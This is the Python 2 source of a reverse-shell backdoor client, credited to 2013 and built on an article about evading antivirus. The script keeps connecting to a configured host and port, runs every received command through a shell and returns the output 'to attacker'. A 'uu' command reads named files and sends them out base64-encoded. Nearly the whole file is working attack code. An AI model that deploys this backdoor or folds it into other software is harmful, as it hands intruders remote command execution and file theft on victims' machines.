#!/usr/bin/python2

# Copyright (c) 2013 Quentin Gibert 
# All rights reserved.

#  Based on the work of:
#  David Kennedy: http://www.secmaniac.com/june-2011/creating-a-13-line-backdoor-worry-free-of-av/
#  Xavier Garcia: www.shellguardians.com

#Permission is hereby granted, free of charge, to any person obtaining a copy of
#this software and associated documentation files (the "Software"), to deal in
#the Software without restriction, including without limitation the rights to
#use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
#the Software, and to permit persons to whom the Software is furnished to do so,
#subject to the following conditions:
#
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
#FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
#COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
#IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
#CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

import socket
import subprocess
import sys
import time
import shlex
import base64

HOST = '127.0.0.1'    # The remote host
PORT = 8080           # The same port as used by the server



def connect((host, port)):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def wait_for_command(s):
    data = s.recv(1024)
    data_arr = shlex.split(data)
    if data == "quit\n":
        s.close()
        sys.exit(0)
    # the socket died
    elif len(data)==0:
        return True
    elif (len(data_arr) > 1) and (data_arr[0] == "uu"):
        for i in range(1, len(data_arr)):
            try:
                f = open(data_arr[i], 'rb')
                pass
            except IOError, e:
                s.send("=> " + str(e) + "\n")
                continue
            fdata = file.read(f)
            f.close()
            s.send("BEGIN: " + data_arr[i] + "\n")
            s.send(base64.encodestring(fdata))
            s.send("END: " + data_arr[i] + "\n")
    else:
        # do shell command
        proc = subprocess.Popen(data, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            stdin=subprocess.PIPE)
        # read output
        stdout_value = proc.stdout.read() + proc.stderr.read()
        # send output to attacker
        s.send(stdout_value)
        return False

def main():
    while True:
        socked_died=False
        try:
            s=connect((HOST,PORT))
            while not socked_died:
                socked_died=wait_for_command(s)
            s.close()
        except socket.error:
            pass
        time.sleep(5)

if __name__ == "__main__":
    sys.exit(main())

